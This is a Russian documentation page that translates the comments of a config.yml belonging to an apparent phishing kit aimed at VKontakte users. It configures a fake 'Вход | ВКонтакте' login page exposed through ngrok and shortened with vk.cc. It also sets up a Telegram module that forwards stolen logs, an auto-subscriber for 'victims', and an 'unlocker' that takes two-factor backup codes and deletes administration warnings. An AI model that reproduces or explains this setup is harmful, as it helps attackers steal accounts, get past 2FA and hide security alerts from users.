# Перевод комментариев в Файле `config.yml`

[⬅️ Вернутся к Инструкции по установке](./installation.ru.md)  
[⬅️ Вернутся на главную](../README.md)

```YAML
title: Вход | ВКонтакте # Заголовок ссылки
image: https://vk.com/images/brand/vk-logo.png # Картинка ссылки
exit: https://vk.com/im # URL перенаправления после успешной авторизации
port: 3000 # Порт для работы сервера
authUrl: /auth # URL авторизации. Если не знаете что такое, то не меняйте
# exposePluginsConfigOnClient: false # Очень старая опция, которая может спалить ваши токены VK CC, поэтому тоже не советую её трогать

plugins: # Список плагинов и их настроек
  dumper: true # Автодампер. Чтобы отключить поменяйте на false
  ngrok: # Конфигурация NGrok. Подробнее: https://ngrok.com/docs#config
    region: eu
    enabled: true
    ## Если у вас есть токен Ngrok и вы хотите, чтобы ваша
    ## Ссылка жила больше 8 часов, то уберите # на следующей строке и вставьте туда токен.
    # authtoken:
  vkcc:
    tokens: [] # Стандартные ключи доступа к VK.cc. Можно получить через https://vkhost.github.io
    enabled: true

  telegram: # Модуль отправки логов в Телеграм
    token: "111:xxxxx" # Токен бота
    chatId: ["11211331"] # Ваш ID, или имя контакта чата
    lang: en # По умолчанию стоит en, меняйте на ru
    successOnly: true # Если true, то шлёт только успешные логи. Если хотите все - ставьте false
    enabled: false # Чтобы включить модуль, поменяйте на true

  auto-subscriber: # Модуль для авто подписки жертв на список сообществ
    groups: # Список сообществ
      - 1 # Можно воткнуть ID группы
      - vk.com/xxhaxteam # Или ссылку на неё
      - team # И домен
      - "@dont_panic_42" # Или упоминание, но в ковычках
    timeout: 1000 # Время между подписками в мс. 1с = 1000мс
    enabled: false # Чтобы включить модуль, поменяйте на true

  unlocker: # Модуль для получение резервных кодов доступа к страницам с 2ух-факторкой
    removeAdminMessages: true # Если true, то автоматически удаляет сообщение от администрации

    # Токен рукапчи. Иногда, для входа,
    # требуется рещить капчу.
    # https://rucaptcha.com/for-customer
    ruCaptchaToken:
    enabled: true # Чтобы выключить модуль, поменяйте на false

  banner: true # Пафосный банер при запуске

```

[⬅️ Вернутся к Инструкции по установке](./installation.ru.md)  
[⬅️ Вернутся на главную](../README.md)